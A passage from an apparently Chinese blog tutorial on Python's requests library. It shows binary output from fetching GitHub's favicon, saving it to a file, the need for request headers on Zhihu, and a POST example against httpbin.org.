class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00'</span></span><br></pre></td></tr></table></figure><br>这个抓取的就是Github站点显示的小图标</p>
<p>前两行是r.text的结果，最后的二进制码是r.content的结果<br>通过最后一行前面的b 可以知道是bytes类型的数据，转换成str类型之后就会出现乱码</p>
<p>接下来把提取的图片保存下来：<br><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">r=requests.<span class="built_in">get</span>(<span class="string">"https://github.com/favicon.ico"</span>)</span><br><span class="line"><span class="comment"># print(r.text)</span></span><br><span class="line"><span class="comment"># print(r.content)</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'favicon.ico'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.<span class="built_in">write</span>(r.content)</span><br></pre></td></tr></table></figure><br><img src="/img/python3/4.png" alt="avatar"></p>
<p>成功抓取到</p>
<h3 id="添加headers"><a href="#添加headers" class="headerlink" title="添加headers"></a>添加headers</h3><p>和urllib一样，我们也可以通过headers参数来传递头信息<br>比如知乎的例子，不传递headers就不能正常请求，还有可能被WAF封IP<br>错误示范：<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>400 Bad Request<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">bgcolor</span>=<span class="string">"white"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>400 Bad Request<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span>openresty<span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>可以看到直接就被拒绝了，正确做法就和上面一样</p>
<h2 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h2><p>刚才那些方法都是GET请求，还有一种常见的就是POST请求<br><figure class="highlight xl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">data</span>=&#123;<span class="string">'name'</span>:<span class="string">'germey'</span>,<span class="string">'age'</span>:<span class="string">'22'</span>&#125;</span><br><span class="line">r=requests.post(<span class="string">"http://httpbin.org/post"</span>,<span class="keyword">data</span>=<span class="keyword">data</span>)</span><br><span class="line">print(r.<span class="keyword">text</span>)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"args"</span>: &#123;&#125;, </span><br><span class="line">  <span class="string">"data"</span>: <span class="string">""</span>, </span><br><span class="line">  <span class="string">"files"</span>: &#123;&#125;, </span><br><span class="line">  <span class="string">"form"</span>: &#123;</span><br><span class="line">    <span class="string">"age"</span>: <span class="string">"22"</span>, </span><br><span class="line">    <span class="string">"name"</span>: <span class="string">"germey"</span></span><br><span class="line">  &#125;, </span><br><span class="line">  <span class="string">"headers"</span>: &#123;</span><br><span class="line">    <span class="string">"Accept"</span>: <span class="string">"*/*"</span>, </span><br><span class="line">    <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>, </span><br><span class="line">    <span class="string">"Content-Length"</span>: <span class="string">"18"</span>, </span><br><span class="line">    <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>, </span><br><span class="line">    <span class="string">"Host"</span>: <span class="string">"httpbin.org"</span>, </span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"python-requests/2.22.0"</span>, </span><br><span class="line">    <span class="string">"X-Amzn-Trace-Id"</span>: <span class="string">"Root=1-5e76c36a-e9bb1d6bc0bd5c45994114f0"</span></span><br><span class="line">  &#125;, </span><br><span class="line">  <span class="string">"json"</span>: null, </span><br><span class="line">  <span class="string">"origin"</span>: <span class="string">"117.136.85.194"</span>, </span><br><span class="line">  <span class="string">"url"</span>: <span class="string">"http://httpbin.org/post"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们可以发现form中就是提交的数据，这就证明POST请求成功发送了</p>
